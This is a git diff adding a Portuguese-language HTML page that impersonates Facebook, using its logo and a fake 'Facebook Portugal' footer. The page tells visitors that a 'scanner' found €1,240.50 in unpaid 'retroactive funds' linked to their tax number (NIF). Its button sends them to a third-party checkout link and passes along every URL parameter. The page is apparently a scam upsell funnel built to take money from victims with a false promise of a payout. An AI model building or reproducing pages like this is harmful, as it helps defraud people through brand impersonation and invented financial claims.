@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+
+<head>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wnj6nzjur9");
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recuperação de Fundos Facebook</title>
+    <link rel="stylesheet" href="/css/upsell-premium.css">
+</head>
+
+<body>
+    <div class="premium-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" class="logo" style="height: 30px;">
+        </div>
+
+        <div class="badge">Saldo Esquecido Detetado</div>
+
+        <h1 class="title">Recuperação de <span style="color: #7c3aed;">Fundos Retroativos</span></h1>
+
+        <div class="description">
+            O nosso scanner final identificou uma reserva de tarefas premium concluídas que <strong>nunca foram processadas</strong>.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">VALOR EXTRA RETROATIVO</div>
+            <div class="amount-value" style="color: #7c3aed;">€1.240,50</div>
+        </div>
+
+        <div class="description">
+            Este é o maior saldo pendente detetado no seu NIF. Ative a recuperação agora para consolidar todo o valor no seu pagamento de hoje.
+        </div>
+
+        <button onclick="redirectToPayment()" class="cta-button pulse" style="background: #7c3aed; box-shadow: 0 10px 20px rgba(124, 58, 237, 0.2);">
+            <span>RECUPERAR €1.240,50 AGORA</span>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+        </button>
+
+        <p class="footer-text">
+            © 2026 Facebook Portugal. Válido apenas para contas Verificadas.
+        </p>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramsObject = {};
+            params.forEach((value, key) => {
+                paramsObject[key] = value;
+            });
+            return paramsObject;
+        }
+
+        function redirectToPayment() {
+            const params = new URLSearchParams(window.location.search);
+            const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=9');
+
+            params.forEach((value, key) => {
+                checkoutUrl.searchParams.set(key, value);
+            });
+
+            window.location.href = checkoutUrl.toString();
+        }
+    </script>
+</body>
+
+</html>
